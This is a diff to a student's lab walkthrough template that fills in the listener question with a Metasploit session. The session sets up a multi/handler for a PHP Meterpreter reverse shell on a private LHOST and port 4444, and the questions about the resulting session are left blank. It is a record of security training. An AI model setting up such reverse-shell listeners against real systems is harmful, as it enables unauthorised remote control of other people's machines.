@@ -108,7 +108,51 @@ walkthrough-YOURNAME.md
 
 ### 🔹 Listener Details
 
-- What listener did you set up (command)? - 
+- What listener did you set up (command)?
+  $ msfconsole                                                                                  
+Metasploit tip: When in a module, use back to go back to the top level 
+prompt
+                                                  
+
+MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMM                MMMMMMMMMM
+MMMN$                           vMMMM
+MMMNl  MMMMM             MMMMM  JMMMM
+MMMNl  MMMMMMMN       NMMMMMMM  JMMMM
+MMMNl  MMMMMMMMMNmmmNMMMMMMMMM  JMMMM
+MMMNI  MMMMMMMMMMMMMMMMMMMMMMM  jMMMM
+MMMNI  MMMMMMMMMMMMMMMMMMMMMMM  jMMMM
+MMMNI  MMMMM   MMMMMMM   MMMMM  jMMMM
+MMMNI  MMMMM   MMMMMMM   MMMMM  jMMMM
+MMMNI  MMMNM   MMMMMMM   MMMMM  jMMMM
+MMMNI  WMMMM   MMMMMMM   MMMM#  JMMMM
+MMMMR  ?MMNM             MMMMM .dMMMM
+MMMMNm `?MMM             MMMM` dMMMMM
+MMMMMMN  ?MM             MM?  NMMMMMN
+MMMMMMMMNe                 JMMMMMNMMM
+MMMMMMMMMMNm,            eMMMMMNMMNMM
+MMMMNNMNMMMMMNx        MMMMMMNMMNMMNM
+MMMMMMMMNMMNMMMMm+..+MMNMMNMNMMNMMNMM
+        https://metasploit.com
+
+
+       =[ metasploit v6.4.84-dev                                ]
++ -- --=[ 2,547 exploits - 1,309 auxiliary - 1,683 payloads     ]
++ -- --=[ 431 post - 49 encoders - 13 nops - 9 evasion          ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+The Metasploit Framework is a Rapid7 Open Source Project
+
+msf > use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf exploit(multi/handler) > set payload php/meterpreter_reverse_tcp
+payload => php/meterpreter_reverse_tcp
+msf exploit(multi/handler) > set LHOST 192.168.0.201 
+LHOST => 192.168.0.201
+msf exploit(multi/handler) > set LPORT 4444
+LPORT => 4444
+msf exploit(multi/handler) > run
+
 - What session did you receive back? - 
 - Paste a sample output (e.g. `meterpreter >`)
 
